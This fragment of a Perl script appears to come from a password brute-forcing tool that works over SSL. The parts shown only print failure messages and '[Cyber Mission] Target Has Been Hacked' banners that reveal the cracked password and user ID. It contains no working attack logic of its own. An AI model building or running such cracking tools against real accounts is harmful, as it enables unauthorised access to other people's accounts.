...
if (!defined $success)
{
print "No Correct $password -> Cracking Password : \n";
close SSL;
}
else
{
...
print " [Cyber Mission] Your Target Has Been Hacked Password - $password :Done\n";
print "\n▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n";
print " [Cyber Mission] Finded Out Correct - $password :Hacked\n";
print "\n[Cyber Mission] Target User ID-  $user ...\n\n";
print "▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n\n";
close SSL;
exit;
}
